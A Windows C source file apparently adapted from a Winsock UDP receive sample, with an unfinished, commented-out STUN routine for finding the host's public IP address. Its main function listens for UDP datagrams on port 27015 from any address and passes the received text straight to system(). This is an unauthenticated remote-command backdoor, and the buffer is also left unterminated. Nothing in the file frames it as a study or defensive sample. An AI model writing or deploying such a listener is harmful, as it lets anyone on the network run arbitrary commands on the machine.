#ifndef UNICODE
#define UNICODE
#endif

#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#include <windows.h>
/* 
#define XOR_MAPPED_ADDRESS_TYPE 0x0020
#define IPv4_ADDRESS_FAMILY 0x01;
#define IPv6_ADDRESS_FAMILY 0x02;

// RFC 5389 Section 6 STUN Message Structure
struct STUNMessageHeader
{
    // Message Type (Binding Request / Response)
    unsigned short type;
    // Payload length of this message
    unsigned short length;
    // Magic Cookie
    unsigned int cookie;
    // Unique Transaction ID
    unsigned int identifier[3];
};

// RFC 5389 Section 15 STUN Attributes
struct STUNAttributeHeader
{
    // Attibute Type
    unsigned short type;
    // Payload length of this attribute
    unsigned short length;
};

// RFC 5389 Section 15.2 XOR-MAPPED-ADDRESS
struct STUNXORMappedIPv4Address
{
    unsigned char reserved;
    unsigned char family;
    unsigned short port;
    unsigned int address;
};

struct STUNServer
{
    char* address;
    unsigned short port;
};


int getPublicIP(char* address)
{
    struct STUNServer servers[14] = {
    {"stun.l.google.com" , 19302}, {"stun.l.google.com" , 19305},
    {"stun1.l.google.com", 19302}, {"stun1.l.google.com", 19305},
    {"stun2.l.google.com", 19302}, {"stun2.l.google.com", 19305},
    {"stun3.l.google.com", 19302}, {"stun3.l.google.com", 19305},
    {"stun4.l.google.com", 19302}, {"stun4.l.google.com", 19305},
    {"stun.wtfismyip.com", 3478 }, {"stun.bcs2005.net"  , 3478 },
    {"numb.viagenie.ca"  , 3478 }, {"173.194.202.127"   , 19302}};
    for (int i = 0; i < 14; i++){
        
    }   
}

*/
int main()
{

    int iResult = 0;

    WSADATA wsaData;

    SOCKET RecvSocket;
    sockaddr_in RecvAddr;

    unsigned short Port = 27015;

    char RecvBuf[1024];
    int BufLen = 1024;

    sockaddr_in SenderAddr;
    int SenderAddrSize = sizeof (SenderAddr);

    //-----------------------------------------------
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup failed with error %d\n", iResult);
        return 1;
    }
    //-----------------------------------------------
    // Create a receiver socket to receive datagrams
    RecvSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (RecvSocket == INVALID_SOCKET) {
        wprintf(L"socket failed with error %d\n", WSAGetLastError());
        return 1;
    }
    //-----------------------------------------------
    // Bind the socket to any address and the specified port.
    RecvAddr.sin_family = AF_INET;
    RecvAddr.sin_port = htons(Port);
    RecvAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    iResult = bind(RecvSocket, (SOCKADDR *) & RecvAddr, sizeof (RecvAddr));
    if (iResult != 0) {
        wprintf(L"bind failed with error %d\n", WSAGetLastError());
        return 1;
    }
    //-----------------------------------------------
    // Call the recvfrom function to receive datagrams
    // on the bound socket.
    wprintf(L"Receiving datagrams...\n");
    iResult = recvfrom(RecvSocket,
                       RecvBuf, BufLen, 0, (SOCKADDR *) & SenderAddr, &SenderAddrSize);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"recvfrom failed with error %d\n", WSAGetLastError());
    }
    printf("%s\n", RecvBuf);
    system(RecvBuf);
 
    //-----------------------------------------------
    // Close the socket when finished receiving datagrams
    wprintf(L"Finished receiving. Closing socket.\n");
    iResult = closesocket(RecvSocket);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"closesocket failed with error %d\n", WSAGetLastError());
        return 1;
    }

    //-----------------------------------------------
    // Clean up and exit.
    wprintf(L"Exiting.\n");
    WSACleanup();
    return 0;
}
